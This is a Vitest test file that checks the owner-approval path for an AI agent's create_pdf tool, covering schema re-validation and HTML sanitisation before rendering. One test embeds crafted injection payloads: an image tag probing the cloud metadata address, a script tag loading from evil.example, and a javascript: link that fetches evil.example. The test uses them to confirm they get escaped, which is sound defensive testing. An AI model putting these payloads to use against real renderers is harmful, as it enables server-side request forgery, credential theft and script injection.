import { describe, it, expect, vi, beforeEach } from "vitest";
import { makeFakeClient } from "@/test/mcp-fake-client";

/**
 * The approve path END TO END through the REAL `create_pdf` descriptor.
 *
 * `proposal-actions.test.ts` mocks `./tool-descriptors` wholesale, so nothing
 * there ever drives a real tool. `proposal-actions.real-descriptor.test.ts`
 * joins that seam for `create_automation`; this file joins it for `create_pdf`,
 * which needs a different client fake (Storage + attachments rather than
 * automation rules) and therefore its own module-level mock.
 *
 * Only Chromium is mocked. The descriptor, its schema re-validation, the
 * markdown pipeline and the attachment write are all real.
 */

const requireUser = vi.fn();
const getProposalForDecision = vi.fn();
const claimProposalDecision = vi.fn();
const settleProposalOutcome = vi.fn();

let fake = makeFakeClient({});

vi.mock("@/lib/auth/session", () => ({ requireUser: () => requireUser() }));
vi.mock("@/lib/supabase/server", () => ({
  createClient: async () => fake.getClient(),
}));
vi.mock("next/cache", () => ({ revalidatePath: () => {} }));
vi.mock("./proposals-db", async (importOriginal) => ({
  ...(await importOriginal<typeof import("./proposals-db")>()),
  getProposalForDecision: (...a: unknown[]) => getProposalForDecision(...a),
  claimProposalDecision: (...a: unknown[]) => claimProposalDecision(...a),
  settleProposalOutcome: (...a: unknown[]) => settleProposalOutcome(...a),
}));
// The one thing that must not really happen in a unit run. Typed with the real
// signature so the assertions below read the arguments, not `unknown`.
const renderHtmlToPdf = vi.fn<
  (html: string, opts: { landscape: boolean }) => Promise<Buffer>
>(async () => Buffer.from("%PDF-1.4 pretend"));
vi.mock("@/lib/reports/pdf", () => ({
  renderHtmlToPdf: (html: string, opts: { landscape: boolean }) =>
    renderHtmlToPdf(html, opts),
}));

const { decideProposal } = await import("./proposal-actions");

const PROPOSAL_ID = "11111111-1111-4111-8111-111111111111";
const ITEM = "33333333-3333-4333-8333-333333333333";
const OWNER = "44444444-4444-4444-8444-444444444444";
const DAY_MS = 24 * 60 * 60 * 1000;

function proposal(input: Record<string, unknown>) {
  return {
    id: PROPOSAL_ID,
    userAgentId: "agent-1",
    runId: "run-1",
    orgId: "org-1",
    ownerId: OWNER,
    capability: "files.write",
    toolName: "create_pdf",
    toolCallId: "call-1",
    input,
    summary: "…",
    status: "pending",
    expiresAt: new Date(Date.now() + 6 * DAY_MS).toISOString(),
    createdAt: new Date(Date.now() - DAY_MS).toISOString(),
    result: null,
  };
}

beforeEach(() => {
  fake = makeFakeClient({});
  renderHtmlToPdf.mockClear();
  requireUser.mockReset().mockResolvedValue({ id: OWNER });
  getProposalForDecision.mockReset();
  claimProposalDecision.mockReset().mockResolvedValue(true);
  settleProposalOutcome.mockReset().mockResolvedValue(true);
});

describe("decideProposal — create_pdf", () => {
  it("renders and attaches when the owner approves", async () => {
    getProposalForDecision.mockResolvedValue(
      proposal({ itemId: ITEM, fileName: "brief", content: "# Hi\n\nThere." }),
    );
    const r = await decideProposal({ id: PROPOSAL_ID, approve: true });
    expect(r.ok).toBe(true);
    expect(fake.calls.storage.map((s) => s.op)).toEqual(["upload"]);
    expect(fake.calls.attachments[0]).toMatchObject({
      mime_type: "application/pdf",
      // The APPROVER is the actor, exactly as for every other approved tool.
      uploaded_by: OWNER,
    });
  });

  /**
   * The security property, exercised through the WHOLE approved path rather
   * than a unit: a proposal stored days ago carries model-authored text, and
   * what Chromium is finally handed must contain no fetchable construct. This
   * is the one place the stored blob, the schema re-validation, the markdown
   * pipeline and the renderer call are joined.
   */
  it("hands Chromium a document with nothing to fetch, even from a crafted blob", async () => {
    getProposalForDecision.mockResolvedValue(
      proposal({
        itemId: ITEM,
        fileName: "brief",
        content:
          '# T\n\n<img src="http://169.254.169.254/latest/meta-data/">\n\n' +
          "<script src='https://evil.example/x.js'></script>\n\n" +
          "[go](javascript:fetch('https://evil.example'))",
      }),
    );
    const r = await decideProposal({ id: PROPOSAL_ID, approve: true });
    expect(r.ok).toBe(true);

    const html = renderHtmlToPdf.mock.calls[0][0];
    const body = html.slice(
      html.indexOf('<main class="doc">'),
      html.indexOf("</main>"),
    );
    expect(body).not.toMatch(/<img|<script|<iframe|<link|<a\s/i);
    expect(body).not.toMatch(/\bhref="/);
    expect(body).toContain("&lt;img");
    // A4 portrait, and `src/lib/reports/pdf.ts` untouched by this feature.
    expect(renderHtmlToPdf.mock.calls[0][1]).toEqual({ landscape: false });
  });

  // Step 5 of decideProposal: a blob stored days ago is re-validated against
  // the tool's CURRENT schema before anything executes.
  it("refuses a stored blob that no longer satisfies the schema", async () => {
    getProposalForDecision.mockResolvedValue(
      proposal({ itemId: ITEM, fileName: "brief" }),
    );
    const r = await decideProposal({ id: PROPOSAL_ID, approve: true });
    expect(r.ok).toBe(false);
    expect(fake.calls.storage).toHaveLength(0);
    expect(renderHtmlToPdf).not.toHaveBeenCalled();
  });
});
